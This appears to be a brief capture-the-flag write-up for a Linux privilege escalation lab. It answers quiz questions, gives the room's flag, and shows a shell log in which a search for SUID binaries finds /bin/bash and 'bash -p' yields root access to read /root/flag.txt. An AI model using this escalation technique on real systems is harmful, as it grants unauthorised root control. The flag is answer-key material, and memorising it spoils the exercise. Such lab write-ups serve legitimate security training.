
- What type of privilege escalation involves using a user account to execute commands as an administrator?
```
vertical
```
- What is the name of the file that contains a list of users who are a part of the sudo group
```
sudoers
```
- What are the contents of the file located at /root/flag.txt?
```
thm{2fb10afe933296592}
```
```
bash-4.4$ find / -type f -perm -u=s 2>/dev/null                                                                                                                                       
/bin/umount                                                                                                                                                                            
/bin/mount                                                                                                                                                                             
/bin/su                                                                                                                                                                                
/bin/fusermount                                                                                                                                                                        
/bin/bash                                                                                                                                                                              
/bin/ping          
bash -p

bash-4.4# cd /root
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt 
thm{2fb10afe933296592}
bash-4.4# whoami
root
bash-4.4# id
uid=1000(cmnatic) gid=1000(cmnatic) euid=0(root) groups=1000(cmnatic),24(cdrom),30(dip),46(plugdev)
bash-4.4# 

```
